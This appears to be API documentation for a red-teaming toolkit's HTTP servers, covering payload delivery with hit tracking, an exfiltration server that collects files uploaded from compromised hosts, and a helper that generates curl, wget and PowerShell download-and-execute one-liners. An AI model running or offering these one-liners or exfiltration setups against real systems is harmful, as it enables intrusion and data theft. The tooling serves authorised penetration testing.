# HTTP Server API

OFX provides powerful HTTP server utilities for payload delivery, data exfiltration, and file hosting during red teaming operations.

## Quick Reference

| Server Type | Purpose | Default Port |
|-------------|---------|--------------|
| **SimpleHTTPServer** | Static file serving | 8000 |
| **PayloadServer** | Payload delivery with hit tracking | 8080 |
| **ExfilServer** | File upload collection | 9000 |

## Server Types

### SimpleHTTPServer

Basic HTTP file server for serving static files from a directory.

```python
from ofx.api.httpserver import SimpleHTTPServer

# Serve files from current directory
server = SimpleHTTPServer(port=8000)
server.start()

# Serve files from specific directory
server = SimpleHTTPServer(
    port=8080,
    directory="/var/www/html",
    use_https=True  # Auto-generates SSL certificate
)
server.start()

print(f"Server running at {server.url}")
server.stop()
```

### PayloadServer

HTTP server designed for delivering payloads with request tracking.

```python
from ofx.api.httpserver import PayloadServer

server = PayloadServer(port=8080)

# Add payloads programmatically
server.add_payload("/shell.sh", content="#!/bin/bash\nwhoami")
server.add_payload("/exploit.py", file="/path/to/exploit.py")

server.start()

# Track payload downloads
print(f"Shell downloaded: {server.get_hits('/shell.sh')} times")

server.stop()
```

### ExfilServer

HTTP server for collecting uploaded files from compromised systems.

```python
from ofx.api.httpserver import ExfilServer

server = ExfilServer(
    port=9000,
    save_dir="/tmp/exfil"  # Where uploads are saved
)
server.start()

# List received files
print(f"Files received: {server.list_files()}")

# Get path to specific file
file_path = server.get_file_path("secrets.txt")
if file_path:
    print(file_path.read_text())

server.stop()
```

## Common Features

All server types support these common operations:

### Lifecycle Management

```python
server.start(daemon=True)  # Start in background thread
server.pause()             # Temporarily stop accepting requests
server.resume()            # Resume accepting requests
server.stop()              # Stop server and release resources
```

### Properties

```python
server.url         # Full URL (e.g., "http://0.0.0.0:8080")
server.is_running  # True if server is currently running
server.host        # Bound IP address
server.port        # Bound port number
```

### HTTPS Support

All servers support automatic HTTPS with self-signed certificates:

```python
server = SimpleHTTPServer(
    port=443,
    use_https=True,
    certfile=None  # Auto-generates certificate
)
```

Or provide your own certificate:

```python
from pathlib import Path

server = SimpleHTTPServer(
    port=443,
    use_https=True,
    certfile=Path("/path/to/cert.pem")
)
```

### IPv6 Support

```python
server = SimpleHTTPServer(
    host="::",           # Bind to all IPv6 interfaces
    port=8080,
    is_ipv6=True
)
```

## Utility Functions

### start_server

Factory function to quickly start any server type:

```python
from ofx.api.httpserver import start_server

# Start simple file server
server = start_server("simple", port=8000, directory="/var/www")

# Start payload server
server = start_server("payload", port=8080)

# Start exfil server
server = start_server("exfil", port=9000, save_dir="/tmp/uploads")
```

### create_oneliner

Generate one-liner commands for payload download and execution:

```python
from ofx.api.httpserver import create_oneliner

url = "http://192.168.1.100:8080/payload.sh"

# Generate curl one-liner
print(create_oneliner(url, method="curl"))
# Output: curl -s http://192.168.1.100:8080/payload.sh | bash

# Generate wget one-liner
print(create_oneliner(url, method="wget"))
# Output: wget -q -O - http://192.168.1.100:8080/payload.sh | bash

# Generate PowerShell one-liner
print(create_oneliner(url, method="powershell"))
# Output: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://...')"

# Generate Python one-liner
print(create_oneliner(url, method="python"))
```

## Extending with Custom Servers

Create custom servers by extending `BaseServerFacade`:

```python
from http.server import BaseHTTPRequestHandler
from ofx.api.httpserver import BaseServerFacade

class MyRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Hello from custom server!")

class MyCustomServer(BaseServerFacade):
    def __init__(self, host="0.0.0.0", port=8080):
        super().__init__(host=host, port=port)
        self._server = self._create_server(MyRequestHandler)

# Use your custom server
server = MyCustomServer(port=9999)
server.start()
```

## Running Multiple Servers

You can now run multiple server instances simultaneously:

```python
from ofx.api.httpserver import SimpleHTTPServer, PayloadServer, ExfilServer

# Start multiple servers on different ports
file_server = SimpleHTTPServer(port=8000)
payload_server = PayloadServer(port=8080)
exfil_server = ExfilServer(port=9000)

file_server.start()
payload_server.start()
exfil_server.start()

print(f"File server: {file_server.url}")
print(f"Payload server: {payload_server.url}")
print(f"Exfil server: {exfil_server.url}")

# Clean up
file_server.stop()
payload_server.stop()
exfil_server.stop()
```

## See Also

- [Reconnaissance APIs](reconnaissance.md) - Network scanning and discovery
- [Exploitation APIs](exploitation.md) - Exploit development tools
- [CLI Commands](../cli/commands.md) - Command-line interface reference
